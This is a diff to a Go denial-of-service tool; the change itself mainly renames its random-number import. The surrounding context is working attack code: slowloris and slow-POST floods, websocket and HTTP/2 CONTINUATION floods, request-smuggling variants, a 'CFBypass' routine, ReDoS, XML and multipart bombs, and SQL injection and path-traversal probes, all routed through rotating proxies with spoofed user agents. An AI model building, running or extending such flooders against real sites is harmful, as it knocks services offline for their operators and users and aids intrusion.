@@ -4,19 +4,18 @@ import (
     "bufio"
     "bytes"
     "compress/gzip"
+    "crypto/rand"
     "crypto/tls"
     "encoding/base64"
     "flag"
     "fmt"
     "io"
     "log"
-    "math/rand/v2"
+    mrand "math/rand/v2"
     "net"
     "net/http"
     "net/url"
     "os"
-    "os/exec"
-    "runtime"
     "strconv"
     "strings"
     "sync"
@@ -100,7 +99,7 @@ func loadUserAgents(filename string) ([]string, error) {
 }
 
 func randUA() string {
-    return userAgents[rand.IntN(len(userAgents))]
+    return userAgents[mrand.IntN(len(userAgents))]
 }
 
 func loadProxies(filename string) ([]string, error) {
@@ -175,7 +174,7 @@ func drawUI(target, method, proxyFile string, workers, duration int) {
         cRed + "⠀⠀⠀⠀⠀⠀⢸⡀⠀⠀⠀⠉⠳⣄⠀⠀⠹⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣼⣶⣶⢒⣒⡒⢤⡤⠀⠀⢦⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" + cReset,
         cRed + "⠀⢰⣶⣿⣿⣿⣾⣧⣤⣬⣤⣀⣙⣿⣤⣤⡆⠂⠂⡀⠀⠀⠀⠀⣀⠀⠠⠐⠂⠈⡋⣟⣿⣇⣠⡀⡼⣇⣀⡀⠰⣷⣶⣶⣶⠒⠒⠒⠒⠒⠒⠒⠒⠢⠤⢄⡀" + cReset,
         cRed + "⠀⠀⠀⠀⠉⠉⢛⣿⢿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⠂⠂⠀⠉⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣿⣷⣶⣶⣶⣶⣶⣶⣾⣿⠿⠛⠁" + cReset,
-        cRed + "⠀⠀⠀⠀⠀⠀⠈⠛⢻⣿⣿⣿⣿⡏⢁⣀⣀⣠⣤⣤⡤⠀⢀⠀⠀⢀⡀⣀⣠⣤⣿⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⢿⠟⠛⠋⠉⠉⠀⠀⠀⠀" + cReset,
+        cRed + "⠀⠀⠀⠀⠀⠀⠈⠛⢻⣿⣿⣿⣿⡏⢁⣀⣀⣠⣤⣤⡤⠀⢀⠀⠀⢀⡀⣀⣠⣤⣿⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⢿⠟⠛⠋⠉⠉⠀⠀⠀⠀" + cReset,
         cRed + "⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⡿⠿⠛⠛⠉⠀⠀⠒⢾⠤⠤⠤⠀⠚⠛⠉⢩⠙⠛⠛⠟⠿⣿⡿⢿⡿⣿⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" + cReset,
         cRed + "⠀⠀⠀⠀⠀⠀⠀⠀⣀⣿⣿⠟⢻⠁⠀⠀⢀⣀⣀⣀⣀⠤⠀⠀⠀⠀⠀⢀⣤⡤⠼⣴⣤⣤⣤⣤⣿⡿⠿⠛⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" + cReset,
         cRed + "⠠⢶⣶⣶⣿⣦⣤⣠⣿⣿⣶⣾⣿⣶⣿⣿⠿⠿⠛⠁⠀⠀⠀⠀⠤⠤⠶⠿⢿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" + cReset,
@@ -363,14 +362,14 @@ const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 func randString(n int) string {
     b := make([]byte, n)
     for i := range b {
-        b[i] = charset[rand.IntN(len(charset))]
+        b[i] = charset[mrand.IntN(len(charset))]
     }
     return string(b)
 }
 
 func randEmail() string {
     domains := []string{"gmail.com", "yahoo.com", "outlook.com", "proton.me", "mail.ru", "example.com"}
-    return randString(8+rand.IntN(12)) + "@" + domains[rand.IntN(len(domains))]
+    return randString(8+mrand.IntN(12)) + "@" + domains[mrand.IntN(len(domains))]
 }
 
 func dialViaProxy(network, addr string, proxyURL *url.URL) (net.Conn, error) {
@@ -518,54 +517,54 @@ func httpGet(url string, client *http.Client) error {
 func genFormPayload() (string, string) {
     payloads := []func() string{
         func() string {
-            return "username=" + randString(8+rand.IntN(16)) +
-                "&password=" + randString(12+rand.IntN(20)) +
+            return "username=" + randString(8+mrand.IntN(16)) +
+                "&password=" + randString(12+mrand.IntN(20)) +
                 "&email=" + randEmail() +
                 "&csrf_token=" + randString(32)
         },
         func() string {
-            return "search=" + randString(20+rand.IntN(200)) +
+            return "search=" + randString(20+mrand.IntN(200)) +
                 "&category=" + randString(5) +
-                "&page=" + strconv.Itoa(rand.IntN(500)) +
+                "&page=" + strconv.Itoa(mrand.IntN(500)) +
                 "&submit=Search"
         },
         func() string {
             return "name=" + randString(10) +
                 "&email=" + randEmail() +
-                "&subject=" + randString(20+rand.IntN(40)) +
-                "&message=" + randString(200+rand.IntN(2000)) +
+                "&subject=" + randString(20+mrand.IntN(40)) +
+                "&message=" + randString(200+mrand.IntN(2000)) +
                 "&token=" + randString(64)
         },
         func() string {
             var sb strings.Builder
-            n := 50 + rand.IntN(200)
+            n := 50 + mrand.IntN(200)
             for i := 0; i < n; i++ {
                 if i > 0 {
                     sb.WriteByte('&')
                 }
-                sb.WriteString(randString(3 + rand.IntN(8)))
+                sb.WriteString(randString(3 + mrand.IntN(8)))
                 sb.WriteByte('=')
-                sb.WriteString(randString(5 + rand.IntN(30)))
+                sb.WriteString(randString(5 + mrand.IntN(30)))
             }
             return sb.String()
         },
         func() string {
-            size := 10240 + rand.IntN(40960)
+            size := 10240 + mrand.IntN(40960)
             blob := make([]byte, size)
             rand.Read(blob)
             return "data=" + base64.StdEncoding.EncodeToString(blob)
         },
     }
 
-    if rand.IntN(4) == 0 {
+    if mrand.IntN(4) == 0 {
         jsonStr := fmt.Sprintf(
             `{"email":"%s","password":"%s","action":"login","token":"%s","data":"%s"}`,
-            randEmail(), randString(16+rand.IntN(32)), randString(64), randString(200+rand.IntN(1000)),
+            randEmail(), randString(16+mrand.IntN(32)), randString(64), randString(200+mrand.IntN(1000)),
         )
         return jsonStr, "application/json"
     }
 
-    return payloads[rand.IntN(len(payloads))](), "application/x-www-form-urlencoded"
+    return payloads[mrand.IntN(len(payloads))](), "application/x-www-form-urlencoded"
 }
 
 func httpPost(targetURL string, client *http.Client) error {
@@ -617,12 +616,12 @@ func (r *slowReader) Read(p []byte) (int, error) {
 }
 
 func httpRudy(targetURL string, client *http.Client, stop <-chan struct{}) error {
-    declaredSize := 1024*1024 + rand.IntN(50*1024*1024)
+    declaredSize := 1024*1024 + mrand.IntN(50*1024*1024)
     chunk := []byte("comment=" + randString(50) + "&" + randString(10) + "=" + randString(20) + "&")
 
     slow := &slowReader{
         data:  chunk,
-        delay: time.Duration(500+rand.IntN(2000)) * time.Millisecond,
+        delay: time.Duration(500+mrand.IntN(2000)) * time.Millisecond,
         stop:  stop,
     }
 
@@ -783,7 +782,7 @@ func wsFlood(targetURL string, stop <-chan struct{}) error {
 
     var proxyURL *url.URL
     if len(proxyList) > 0 {
-        proxy := proxyList[rand.IntN(len(proxyList))]
+        proxy := proxyList[mrand.IntN(len(proxyList))]
         var err error
         proxyURL, err = url.Parse(proxy)
         if err != nil {
@@ -835,19 +834,19 @@ func wsFlood(targetURL string, stop <-chan struct{}) error {
         }
 
         var err error
-        switch rand.IntN(5) {
+        switch mrand.IntN(5) {
         case 0:
             msg := fmt.Sprintf(`{"action":"%s","data":"%s","ts":%d}`,
-                randString(8), randString(200+rand.IntN(2000)), time.Now().UnixNano())
+                randString(8), randString(200+mrand.IntN(2000)), time.Now().UnixNano())
             err = conn.WriteMessage(websocket.TextMessage, []byte(msg))
         case 1:
-            data := make([]byte, 1024+rand.IntN(7168))
+            data := make([]byte, 1024+mrand.IntN(7168))
             rand.Read(data)
             err = conn.WriteMessage(websocket.BinaryMessage, data)
         case 2:
             err = conn.WriteMessage(websocket.PingMessage, []byte(randString(16)))
         case 3:
-            err = conn.WriteMessage(websocket.TextMessage, []byte(randString(10240+rand.IntN(40960))))
+            err = conn.WriteMessage(websocket.TextMessage, []byte(randString(10240+mrand.IntN(40960))))
         case 4:
             for j := 0; j < 10; j++ {
                 if e := conn.WriteMessage(websocket.TextMessage, []byte(randString(16))); e != nil {
@@ -875,16 +874,16 @@ var apiEndpoints = []string{"/api/v1/users", "/api/v2/data", "/api/graphql", "/a
 func genAPIPayload() string {
     generators := []func() string{
         func() string {
-            bioLen := 2000 + rand.IntN(8000)
+            bioLen := 2000 + mrand.IntN(8000)
             return fmt.Sprintf(
                 `{"user_id":"%d","action":"%s","bio":"%s","nonce":"%s","email":"%s","display_name":"%s"}`,
-                rand.IntN(9999999), apiActions[rand.IntN(len(apiActions))],
-                randString(bioLen), randString(32), randEmail(), randString(12+rand.IntN(20)),
+                mrand.IntN(9999999), apiActions[mrand.IntN(len(apiActions))],
+                randString(bioLen), randString(32), randEmail(), randString(12+mrand.IntN(20)),
             )
         },
         func() string {
             var sb strings.Builder
-            n := 500 + rand.IntN(4500)
+            n := 500 + mrand.IntN(4500)
             sb.WriteString(`{"action":"bulk_insert","token":"`)
             sb.WriteString(randString(64))
             sb.WriteString(`","items":[`)
@@ -893,16 +892,16 @@ func genAPIPayload() string {
                     sb.WriteByte(',')
                 }
                 fmt.Fprintf(&sb, `{"id":%d,"name":"%s","value":"%s"}`,
-                    rand.IntN(9999999), randString(8+rand.IntN(16)), randString(20+rand.IntN(100)))
+                    mrand.IntN(9999999), randString(8+mrand.IntN(16)), randString(20+mrand.IntN(100)))
             }
             sb.WriteString(`]}`)
             return sb.String()
         },
         func() string {
-            depth := 20 + rand.IntN(30)
+            depth := 20 + mrand.IntN(30)
             var sb strings.Builder
             for i := 0; i < depth; i++ {
-                fmt.Fprintf(&sb, `{"level_%d":{"data":"%s","nested":`, i, randString(50+rand.IntN(200)))
+                fmt.Fprintf(&sb, `{"level_%d":{"data":"%s","nested":`, i, randString(50+mrand.IntN(200)))
             }
             sb.WriteString(`{"end":true}`)
             for i := 0; i < depth; i++ {
@@ -913,38 +912,38 @@ func genAPIPayload() string {
         func() string {
             return fmt.Sprintf(
                 `{"query":"mutation { updateUser(input: $input) { id status } }","variables":{"input":{"id":"%d","name":"%s","bio":"%s","settings":{"theme":"%s","lang":"%s","notifications":%t,"data":"%s"}}}}`,
-                rand.IntN(9999999), randString(16), randString(3000+rand.IntN(5000)),
-                randString(8), randString(5), rand.IntN(2) == 1, randString(1000+rand.IntN(4000)),
+                mrand.IntN(9999999), randString(16), randString(3000+mrand.IntN(5000)),
+                randString(8), randString(5), mrand.IntN(2) == 1, randString(1000+mrand.IntN(4000)),
             )
         },
         func() string {
             return fmt.Sprintf(
                 `{"email":"%s","password":"%s","mfa_code":"%06d","device_id":"%s","fingerprint":"%s"}`,
-                randEmail(), randString(16+rand.IntN(32)), rand.IntN(999999),
+                randEmail(), randString(16+mrand.IntN(32)), mrand.IntN(999999),
                 randString(36), randString(64),
             )
         },
         func() string {
             var sb strings.Builder
             sb.WriteString(`{"action":"search","filters":{`)
-            n := 20 + rand.IntN(50)
+            n := 20 + mrand.IntN(50)
             for i := 0; i < n; i++ {
                 if i > 0 {
                     sb.WriteByte(',')
                 }
-                fmt.Fprintf(&sb, `"%s":"%s"`, randString(5+rand.IntN(10)), randString(10+rand.IntN(100)))
+                fmt.Fprintf(&sb, `"%s":"%s"`, randString(5+mrand.IntN(10)), randString(10+mrand.IntN(100)))
             }
             sb.WriteString(fmt.Sprintf(`},"page":%d,"limit":%d,"sort":"%s"}`,
-                rand.IntN(10000), 100+rand.IntN(900), randString(8)))
+                mrand.IntN(10000), 100+mrand.IntN(900), randString(8)))
             return sb.String()
         },
     }
-    return generators[rand.IntN(len(generators))]()
+    return generators[mrand.IntN(len(generators))]()
 }
 
 func httpAPIFlood(targetURL string, client *http.Client) error {
     body := genAPIPayload()
-    fullURL := targetURL + apiEndpoints[rand.IntN(len(apiEndpoints))]
+    fullURL := targetURL + apiEndpoints[mrand.IntN(len(apiEndpoints))]
 
     req, err := http.NewRequest("POST", fullURL, strings.NewReader(body))
     if err != nil {
@@ -993,7 +992,7 @@ func httpSlowloris(targetURL string, stop <-chan struct{}) error {
 
     var rawConn net.Conn
     if len(proxyList) > 0 {
-        proxy := proxyList[rand.IntN(len(proxyList))]
+        proxy := proxyList[mrand.IntN(len(proxyList))]
         pURL, err := url.Parse(proxy)
         if err != nil {
             recordStatus("Err")
@@ -1030,7 +1029,7 @@ func httpSlowloris(targetURL string, stop <-chan struct{}) error {
 
     fmt.Fprintf(conn, "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n", host, randUA())
 
-    ticker := time.NewTicker(1 + time.Duration(rand.IntN(3))*time.Second)
+    ticker := time.NewTicker(1 + time.Duration(mrand.IntN(3))*time.Second)
     defer ticker.Stop()
 
     for {
@@ -1059,7 +1058,7 @@ func httpHeaderFlood(targetURL string, client *http.Client) error {
     }
     req.Header.Set("User-Agent", randUA())
 
-    numHeaders := 50 + rand.IntN(50)
+    numHeaders := 50 + mrand.IntN(50)
     for i := 0; i < numHeaders; i++ {
         req.Header.Set("X-"+randString(8), randString(1024))
     }
@@ -1080,16 +1079,16 @@ func httpHeaderFlood(targetURL string, client *http.Client) error {
 func httpMixPost(targetURL string, client *http.Client) error {
     var body string
     var contentType string
-    switch rand.IntN(4) {
+    switch mrand.IntN(4) {
     case 0:
         contentType = "application/json"
-        body = fmt.Sprintf(`{"data":"%s","id":%d,"token":"%s"}`, randString(500), rand.IntN(9999), randString(32))
+        body = fmt.Sprintf(`{"data":"%s","id":%d,"token":"%s"}`, randString(500), mrand.IntN(9999), randString(32))
     case 1:
         contentType = "application/xml"
-        body = fmt.Sprintf(`<root><data>%s</data><id>%d</id></root>`, randString(500), rand.IntN(9999))
+        body = fmt.Sprintf(`<root><data>%s</data><id>%d</id></root>`, randString(500), mrand.IntN(9999))
     case 2:
         contentType = "application/x-www-form-urlencoded"
-        body = "data=" + randString(500) + "&id=" + strconv.Itoa(rand.IntN(9999))
+        body = "data=" + randString(500) + "&id=" + strconv.Itoa(mrand.IntN(9999))
     case 3:
         contentType = "text/plain"
         body = randString(500)
@@ -1124,7 +1123,7 @@ func httpCFBypass(targetURL string, client *http.Client) error {
     if strings.Contains(targetURL, "?") {
         sep = "&"
     }
-    fullURL := targetURL + sep + "q=" + randString(15) + "&p=" + strconv.Itoa(rand.IntN(9999))
+    fullURL := targetURL + sep + "q=" + randString(15) + "&p=" + strconv.Itoa(mrand.IntN(9999))
 
     req, err := http.NewRequest("GET", fullURL, nil)
     if err != nil {
@@ -1225,7 +1224,7 @@ func (r *chunkDripReader) Read(p []byte) (int, error) {
     select {
     case <-r.stop:
         return 0, io.EOF
-    case <-time.After(time.Duration(500+rand.IntN(1500)) * time.Millisecond):
+    case <-time.After(time.Duration(500+mrand.IntN(1500)) * time.Millisecond):
         n := copy(p, []byte(randString(10)))
         return n, nil
     }
@@ -1285,7 +1284,7 @@ func httpMalformed(targetURL string, stop <-chan struct{}) error {
 
     var rawConn net.Conn
     if len(proxyList) > 0 {
-        proxy := proxyList[rand.IntN(len(proxyList))]
+        proxy := proxyList[mrand.IntN(len(proxyList))]
         pURL, err := url.Parse(proxy)
         if err != nil {
             recordStatus("Err")
@@ -1353,7 +1352,7 @@ func httpH2Continuation(targetURL string, stop <-chan struct{}) error {
 
     var rawConn net.Conn
     if len(proxyList) > 0 {
-        proxy := proxyList[rand.IntN(len(proxyList))]
+        proxy := proxyList[mrand.IntN(len(proxyList))]
         pURL, err := url.Parse(proxy)
         if err != nil {
             recordStatus("Err")
@@ -1500,12 +1499,12 @@ func httpGraphQLBatch(targetURL string, client *http.Client) error {
     fullURL := targetURL + "/api/graphql"
     var sb strings.Builder
     sb.WriteString("[")
-    n := 100 + rand.IntN(500)
+    n := 100 + mrand.IntN(500)
     for i := 0; i < n; i++ {
         if i > 0 {
             sb.WriteByte(',')
         }
-        sb.WriteString(fmt.Sprintf(`{"q%d":{"query":"query { user(id: %d) { name email posts { title } } }"}}`, i, rand.IntN(9999)))
+        sb.WriteString(fmt.Sprintf(`{"q%d":{"query":"query { user(id: %d) { name email posts { title } } }"}}`, i, mrand.IntN(9999)))
     }
     sb.WriteString("]")
     body := sb.String()
@@ -1632,7 +1631,7 @@ func httpSmuggleCLTE(targetURL string, stop <-chan struct{}) error {
 
     var rawConn net.Conn
     if len(proxyList) > 0 {
-        proxy := proxyList[rand.IntN(len(proxyList))]
+        proxy := proxyList[mrand.IntN(len(proxyList))]
         pURL, err := url.Parse(proxy)
         if err != nil {
             recordStatus("Err")
@@ -1763,7 +1762,7 @@ func httpDeleteFlood(targetURL string, client *http.Client) error {
 }
 
 func httpPutFlood(targetURL string, client *http.Client) error {
-    body := fmt.Sprintf(`{"id":"%s","data":"%s","timestamp":%d}`, randString(36), randString(500+rand.IntN(2000)), time.Now().Unix())
+    body := fmt.Sprintf(`{"id":"%s","data":"%s","timestamp":%d}`, randString(36), randString(500+mrand.IntN(2000)), time.Now().Unix())
     sep := "/"
     if strings.HasSuffix(targetURL, "/") {
         sep = ""
@@ -1854,7 +1853,7 @@ func httpSQLiProbe(targetURL string, client *http.Client) error {
         sep = "&"
     }
     payloads := []string{"' OR '1'='1", "1; DROP TABLE users", "' UNION SELECT NULL, version()--"}
-    fullURL := targetURL + sep + "id=" + url.QueryEscape(payloads[rand.IntN(len(payloads))])
+    fullURL := targetURL + sep + "id=" + url.QueryEscape(payloads[mrand.IntN(len(payloads))])
 
     req, err := http.NewRequest("GET", fullURL, nil)
     if err != nil {
@@ -1884,7 +1883,7 @@ func httpPathTraversal(targetURL string, client *http.Client) error {
     if strings.HasSuffix(targetURL, "/") {
         sep = ""
     }
-    fullURL := targetURL + sep + payloads[rand.IntN(len(payloads))]
+    fullURL := targetURL + sep + payloads[mrand.IntN(len(payloads))]
 
     req, err := http.NewRequest("GET", fullURL, nil)
     if err != nil {
@@ -1928,7 +1927,7 @@ func httpSmuggleTete(targetURL string, stop <-chan struct{}) error {
 
     var rawConn net.Conn
     if len(proxyList) > 0 {
-        proxy := proxyList[rand.IntN(len(proxyList))]
+        proxy := proxyList[mrand.IntN(len(proxyList))]
         pURL, err := url.Parse(proxy)
         if err != nil {
             recordStatus("Err")
@@ -2019,7 +2018,7 @@ func httpInvalidReqLine(targetURL string, stop <-chan struct{}) error {
 
     var rawConn net.Conn
     if len(proxyList) > 0 {
-        proxy := proxyList[rand.IntN(len(proxyList))]
+        proxy := proxyList[mrand.IntN(len(proxyList))]
         pURL, err := url.Parse(proxy)
         if err != nil {
             recordStatus("Err")
@@ -2086,7 +2085,7 @@ func httpGhostFlood(targetURL string, stop <-chan struct{}) error {
 
     var rawConn net.Conn
     if len(proxyList) > 0 {
-        proxy := proxyList[rand.IntN(len(proxyList))]
+        proxy := proxyList[mrand.IntN(len(proxyList))]
         pURL, err := url.Parse(proxy)
         if err != nil {
             recordStatus("Err")
@@ -2153,7 +2152,7 @@ func httpFragFlood(targetURL string, stop <-chan struct{}) error {
 
     var rawConn net.Conn
     if len(proxyList) > 0 {
-        proxy := proxyList[rand.IntN(len(proxyList))]
+        proxy := proxyList[mrand.IntN(len(proxyList))]
         pURL, err := url.Parse(proxy)
         if err != nil {
             recordStatus("Err")
@@ -2196,7 +2195,7 @@ func httpFragFlood(targetURL string, stop <-chan struct{}) error {
             totalErrors.Add(1)
             return err
         }
-        time.Sleep(time.Duration(100+rand.IntN(400)) * time.Millisecond)
+        time.Sleep(time.Duration(100+mrand.IntN(400)) * time.Millisecond)
         if i%10 == 0 {
             recordStatus("Sent")
             totalSuccess.Add(1)
@@ -2303,7 +2302,7 @@ func httpSlowRead(targetURL string, client *http.Client, stop <-chan struct{}) e
         if err != nil {
             return nil
         }
-        time.Sleep(time.Duration(1+rand.IntN(5)) * time.Second)
+        time.Sleep(time.Duration(1+mrand.IntN(5)) * time.Second)
         recordStatus("Held")
         totalSuccess.Add(1)
     }
@@ -2329,7 +2328,7 @@ func httpInvalidHeader(targetURL string, stop <-chan struct{}) error {
 
     var rawConn net.Conn
     if len(proxyList) > 0 {
-        proxy := proxyList[rand.IntN(len(proxyList))]
+        proxy := proxyList[mrand.IntN(len(proxyList))]
         pURL, err := url.Parse(proxy)
         if err != nil {
             recordStatus("Err")
@@ -2396,7 +2395,7 @@ func httpRapidConnect(targetURL string, stop <-chan struct{}) error {
 
     var conn net.Conn
     if len(proxyList) > 0 {
-        proxy := proxyList[rand.IntN(len(proxyList))]
+        proxy := proxyList[mrand.IntN(len(proxyList))]
         pURL, err := url.Parse(proxy)
         if err != nil {
             recordStatus("Err")
@@ -2467,7 +2466,7 @@ func httpH2Flood(targetURL string, stop <-chan struct{}) error {
 
     var rawConn net.Conn
     if len(proxyList) > 0 {
-        proxy := proxyList[rand.IntN(len(proxyList))]
+        proxy := proxyList[mrand.IntN(len(proxyList))]
         pURL, err := url.Parse(proxy)
         if err != nil {
             recordStatus("Err")
@@ -2683,7 +2682,7 @@ func httpConnectionSmuggle(targetURL string, stop <-chan struct{}) error {
 
     var rawConn net.Conn
     if len(proxyList) > 0 {
-        proxy := proxyList[rand.IntN(len(proxyList))]
+        proxy := proxyList[mrand.IntN(len(proxyList))]
         pURL, err := url.Parse(proxy)
         if err != nil {
             recordStatus("Err")
@@ -2752,7 +2751,7 @@ func httpLongHeader(targetURL string, stop <-chan struct{}) error {
 
     var rawConn net.Conn
     if len(proxyList) > 0 {
-        proxy := proxyList[rand.IntN(len(proxyList))]
+        proxy := proxyList[mrand.IntN(len(proxyList))]
         pURL, err := url.Parse(proxy)
         if err != nil {
             recordStatus("Err")
@@ -2856,7 +2855,7 @@ func httpDeadConn(targetURL string, client *http.Client, stop <-chan struct{}) e
     defer resp.Body.Close()
     recordStatus(strconv.Itoa(resp.StatusCode))
 
-    time.Sleep(time.Duration(60+rand.IntN(60)) * time.Second)
+    time.Sleep(time.Duration(60+mrand.IntN(60)) * time.Second)
     return nil
 }
 
@@ -2880,7 +2879,7 @@ func httpBadStart(targetURL string, stop <-chan struct{}) error {
 
     var rawConn net.Conn
     if len(proxyList) > 0 {
-        proxy := proxyList[rand.IntN(len(proxyList))]
+        proxy := proxyList[mrand.IntN(len(proxyList))]
         pURL, err := url.Parse(proxy)
         if err != nil {
             recordStatus("Err")
@@ -2923,7 +2922,7 @@ func httpBadStart(targetURL string, stop <-chan struct{}) error {
         return err
     }
 
-    ticker := time.NewTicker(1 + time.Duration(rand.IntN(4))*time.Second)
+    ticker := time.NewTicker(1 + time.Duration(mrand.IntN(4))*time.Second)
     defer ticker.Stop()
 
     for {
@@ -2945,7 +2944,7 @@ func httpBadStart(targetURL string, stop <-chan struct{}) error {
 
 func httpFormBomb(targetURL string, client *http.Client) error {
     var sb strings.Builder
-    n := 1000 + rand.IntN(5000)
+    n := 1000 + mrand.IntN(5000)
     for i := 0; i < n; i++ {
         if i > 0 {
             sb.WriteByte('&')
@@ -3044,7 +3043,7 @@ func httpEventStream(targetURL string, client *http.Client, stop <-chan struct{}
         if err != nil {
             return nil
         }
-        time.Sleep(time.Duration(500+rand.IntN(1000)) * time.Millisecond)
+        time.Sleep(time.Duration(500+mrand.IntN(1000)) * time.Millisecond)
         recordStatus("Held")
         totalSuccess.Add(1)
     }
@@ -3350,7 +3349,7 @@ func httpH2ContinuationBomb(targetURL string, stop <-chan struct{}) error {
 
 func httpMixHeavy(targetURL string, client *http.Client) error {
     var sb strings.Builder
-    depth := 100 + rand.IntN(200)
+    depth := 100 + mrand.IntN(200)
 
     sb.WriteString(`<?xml version="1.0"?><root>`)
     for i := 0; i < depth; i++ {
@@ -3369,7 +3368,7 @@ func httpMixHeavy(targetURL string, client *http.Client) error {
     body := sb.String()
     contentType := "application/xml"
 
-    if rand.IntN(2) == 0 {
+    if mrand.IntN(2) == 0 {
         contentType = "text/xml; charset=utf-8"
     }
 
@@ -3402,18 +3401,18 @@ func httpMixBunchOf(targetURL string, client *http.Client) error {
     var buf bytes.Buffer
     boundary := "----WebKitFormBoundary" + randString(16)
 
-    numParts := 200 + rand.IntN(300)
+    numParts := 200 + mrand.IntN(300)
 
     for i := 0; i < numParts; i++ {
         fmt.Fprintf(&buf, "--%s\r\n", boundary)
-        if rand.IntN(2) == 0 {
+        if mrand.IntN(2) == 0 {
             fmt.Fprintf(&buf, "Content-Disposition: form-data; name=\"%s\"\r\n\r\n", randString(20))
             buf.WriteString(randString(500))
             buf.WriteString("\r\n")
         } else {
             fmt.Fprintf(&buf, "Content-Disposition: form-data; name=\"%s\"; filename=\"%s.bin\"\r\n", randString(10), randString(10))
             buf.WriteString("Content-Type: application/octet-stream\r\n\r\n")
-            binaryData := make([]byte, 1024+rand.IntN(4096))
+            binaryData := make([]byte, 1024+mrand.IntN(4096))
             rand.Read(binaryData)
             buf.Write(binaryData)
             buf.WriteString("\r\n")
@@ -3452,7 +3451,7 @@ func httpMixRegex(targetURL string, client *http.Client) error {
     var body string
     var contentType string
 
-    switch rand.IntN(3) {
+    switch mrand.IntN(3) {
     case 0:
         body = fmt.Sprintf(`{"email":"%s@example.com","user":"%s","pass":"%s"}`, redosCore, redosCore, redosCore)
         contentType = "application/json"
@@ -3505,16 +3504,16 @@ func (r *chunkedSlowReader) Read(p []byte) (int, error) {
         return 0, io.EOF
     }
 
-    time.Sleep(time.Duration(1000+rand.IntN(2000)) * time.Millisecond)
+    time.Sleep(time.Duration(1000+mrand.IntN(2000)) * time.Millisecond)
 
-    n := copy(p, r.data[r.pos:r.pos+1+rand.IntN(1)])
+    n := copy(p, r.data[r.pos:r.pos+1+mrand.IntN(1)])
     r.pos += n
     return n, nil
 }
 
 func httpMixChunkedSlow(targetURL string, client *http.Client, stop <-chan struct{}) error {
     var body string
-    switch rand.IntN(3) {
+    switch mrand.IntN(3) {
     case 0:
         body = fmt.Sprintf(`{"data":"%s","token":"%s"}`, randString(5000), randString(64))
     case 1:
